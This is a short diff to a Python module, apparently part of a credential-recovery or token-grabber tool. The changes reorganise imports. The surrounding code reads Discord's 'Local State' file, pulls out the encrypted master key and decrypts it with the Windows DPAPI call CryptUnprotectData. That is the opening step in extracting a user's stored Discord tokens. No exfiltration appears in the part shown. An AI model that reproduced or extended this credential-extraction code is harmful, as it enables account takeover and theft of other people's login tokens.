@@ -1,20 +1,15 @@
+import json
 import os
-
-from ctypes import windll
-from ctypes import wintypes
-from ctypes import byref
-from ctypes import cdll
-from ctypes import Structure
-from ctypes import POINTER
-from ctypes import c_char
-from ctypes import c_buffer
-from Crypto.Cipher import AES
-from base64 import b64decode
-from json import loads as json_loads
-import threading
 import re
+from base64 import b64decode
 
-from config import Constant
+from ctypes import POINTER, byref
+from ctypes import Structure, c_char, wintypes
+from ctypes import c_buffer, cdll, windll
+
+from Crypto.Cipher import AES
+
+from config import Constant 
 from config import ModuleManager
 
 
@@ -91,7 +86,7 @@ class DiscordRecovery(ModuleManager):
 
         pathKey = path + "/Local State"
         with open(pathKey, 'r', encoding='utf-8') as f:
-            local_state = json_loads(f.read())
+            local_state = json.loads(f.read())
         master_key = b64decode(local_state['os_crypt']['encrypted_key'])
         master_key = self.CryptUnprotectData(master_key[5:])
         self.mdebug(f"[{savefname}] Found and loaded master key")
